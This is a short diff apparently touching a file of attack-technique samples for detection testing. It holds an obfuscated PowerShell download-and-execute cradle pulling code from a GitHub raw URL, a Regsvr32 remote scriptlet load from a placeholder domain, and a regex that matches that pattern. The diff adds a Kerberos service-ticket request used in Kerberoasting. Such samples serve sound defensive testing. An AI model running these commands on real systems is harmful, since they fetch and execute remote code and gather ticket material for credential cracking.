@@ -1,5 +1,8 @@
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-Expression (New-Object Net.WebClient).("D`o`Wn"+"LoAdStRiNg").Invoke('https://github.com/msffluffybunnies/rabbithole/blob/master/test.txt?raw=true')
 
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'DOMAIN/netbios_name_domain'
+
 Regsrv32.exe /s /u /n /i:https://domain.co/testfile.wsc adllfile.dll
 
  \/i\:(\")?(http|\/\/|\\\\).*
